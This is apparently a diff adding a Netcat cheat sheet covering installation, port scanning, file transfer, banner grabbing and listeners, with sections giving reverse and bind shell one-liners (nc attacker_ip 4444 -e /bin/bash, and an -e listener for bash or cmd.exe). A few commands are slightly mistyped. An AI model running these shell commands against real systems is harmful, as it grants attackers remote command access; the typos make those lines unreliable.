@@ -1,0 +1,189 @@
+# Netcat (nc) Cheat Sheet
+
+Netcat, often called the "Swiss Army Knife of Networking", is a versatile networking utility used for reading and writing data across network connections using TCP or UDP. It is widely used in networking, cybersecurity labs, and penetration testing.
+
+## Installation
+
+### Kali Linux
+Netcat is pre-installed.
+Check version:
+nc -h
+
+### Ubuntu / Debian
+sudo apt update
+sudo apt install netcat
+
+or
+sudo apt install netcat-openbsd
+
+### Red Hat / CentOS
+sudo yum install nc
+
+### Arch Linux
+sudo pacman -S gnu-netcat
+
+### Windows
+Use Ncat (comes with Nmap package) or download Netcat for Windows.
+
+## Basic Syntax
+nc [options] target port
+
+Example:
+nc 192.168.1.10 80
+
+## Connection Modes
+- Client mode:
+nc target port
+
+- Listen mode:
+nc -l port
+
+- Verbose output:
+nc -v target port
+
+## TCP and UDP
+- TCP connection (default):
+nc target port
+
+- UDP connection:
+nc -u target port
+
+## Port Scanning
+- Scan single port:
+nc -zv target 80
+
+- Scan port range:
+nc -zv target 20-100
+
+## File Transfer
+- Send file:
+nc -l 4444 < file.txt
+
+- Receive file:
+nc target 4444 > file.txt
+
+## Chat Server (Assisted Communication)
+- Server:
+nc -l 5555
+
+- Client:
+nc target_ip 5555
+
+## Banner Grabbing
+nc target 80
+
+Type:
+GET / HTTP/1.1
+
+## Reverse Shell (Educational)
+- Listener:
+nc -lvp 4444
+
+- Target:
+nc attacker_ip 4444 -e /bin/bash
+
+Note: Some versions do not support -e.
+
+## Bind Shell (Educational)
+- Target:
+nc -lvp 4444 -e /bin/bash
+
+- Attacker:
+nc target_ip 4444
+
+## Timeout and Keep Alive
+- Timeout connection:
+nc -w 5 target port
+
+- Keep listening after disconnect:
+nc -k -l port
+
+## Common Lab Workflow
+1. Test connectivity to target
+2. Scan open ports
+3. Perform banner grabbing
+4. Transfer files
+5. Simulate client-server communication
+
+## Common Use Cases
+- Network troubleshooting
+- Port scanning
+- File transfers
+- Banner grabbing
+- Cybersecurity and ethical hacking labs
+
+Note: Netcat should only be used on authorized systems and for educational or ethical purposes.
+
+##Netcat Commands
+
+*NOTE:* - If on Ubuntu, you need the *REAL* nc package, to get it use:
+
+```
+sudo apt-get -y install netcat-traditional
+sudo update-alternatives --config nc
+# Select the nc.traditional option
+```
+
+Netcat listening on port 567/TCP:
+
+```
+nc -l -p 567
+```
+
+Connecting to that port from another machine:
+
+```
+nc 1.2.3.4 5676
+```
+
+To pipe a text file to the listener:
+
+```
+cat infile | nc 1.2.3.4 567 -q 10
+```
+
+To have the listener save a received text file:
+
+```
+nc -l -p 567 > textfile
+```
+
+To transfer a directory, first at the receiving end set up
+
+```
+nc -l -p 678 | tar xvfpz 
+```
+
+Then send the directory:
+
+```
+tar zcfp - /path/to/directory | nc -w 3 1.2.3.4 678
+```
+
+To send a message to your syslog server (the <0> means emerg):
+
+```
+"echo '<0>message' | nc -w 1 -u syslogger 514"
+```
+
+Setting up a remote shell listener:
+
+```
+nc -v -e '/bin/bash' -l -p 1234 -t
+or
+nc l p 1234 e "c:\windows\system32\cmd.exe"
+```
+
+Then telnet to port 1234 from elsewhere to get the shell.
+
+Using netcat to make an HTTP request
+
+```
+echo -e "GET http://www.google.com HTTP/1.0nn" | nc -w 5 www.google.com 80
+```
+
+Making a one-page webserver; this will feed homepage.txt to all comers.
+
+```
+cat homepage.txt | nc -v -l -p 80
+```
